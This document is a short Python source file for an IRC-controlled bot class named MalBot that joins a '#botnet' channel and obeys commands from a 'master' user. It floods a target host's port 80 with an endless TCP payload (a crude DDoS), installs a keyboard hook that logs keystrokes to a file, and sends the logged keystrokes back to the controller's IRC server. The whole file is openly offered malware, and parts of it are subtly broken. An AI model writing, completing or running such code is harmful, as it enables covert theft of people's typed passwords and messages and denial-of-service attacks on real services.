
import pydle, socket, sys, pyxhook


class MalBot(pydle.Client):

    def on_connect(self):
        self.channel = "#botnet"
        self.log_file_name = 'keylog.txt'
        self.join(self.channel)

    def on_join(self, channel, user):
        super().on_join(channel, user)
        self.message(channel, 'Joined botnet')

    def attack(self, target):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        print("Connection established")
        payload = str.encode("I'm DDOSing your ass" * 420)
        bytes_sent = 0
        while True:
            s.send(payload)
            print("Bytes sent: {}".format(bytes_sent), end='\r')
            bytes_sent += len(payload)
    
    def log_keystroke(event):
        if event.Ascii==13:
            keystroke='\n'
        elif event.Ascii==8:
            keystroke='<BACK SPACE>'
        elif event.Ascii==9:
            keystroke='<TAB>'
        else:
            keystroke=chr(event.Ascii)
        self.log_file.write(keystroke)


    def start_keylogger(self):
        self.log_file = open(self.log_file_name, 'a')
        keylog_hook = pyxhook.HookManager()
        keylog_hook.KeyDown = log_keystroke
        keylog_hook.HookKeyboard()
        keylog_hook.start()

    def stop_keylogger(self):
        self.log_file.close()
        keylog_hook.cancel()
    
    def report_keylog(self):
        self.stop_keylogger()
        self.message(self.channel, "Initiating keylogger report")
        self.log_file = open(self.log_file_name, 'r')
        line = self.log_file.readline()
        while line:
            self.message(self.channel, line)
            line = self.log_file.readline()
        self.log_file.close()
        self.start_keylogger()


    def on_message(self, channel, source, message):
        if source != "master":
            return

        if message.startswith("?ddos"):
            address = message.split()[1]
            print("Acknowledged request to DDOS {}".format(address))
            self.message(self.channel, "Acknowledged request to DDOS {}".format(address))
            self.attack(address)
        elif message == "?keylogger start":
            self.start_keylogger()
        elif message == "?keylogger stop":
            self.stop_keylogger()
        elif message == "?keylogger report":
            self.report_keylog()
        else:
            print("Received message from master: {}, relaying it back to botmaster".format(message))
            self.message(self.channel, message)


client = MalBot(sys.argv[2], realname=sys.argv[2])
client.connect(sys.argv[1], 6697, tls=False, tls_verify=False, password="botnet")
client.handle_forever()

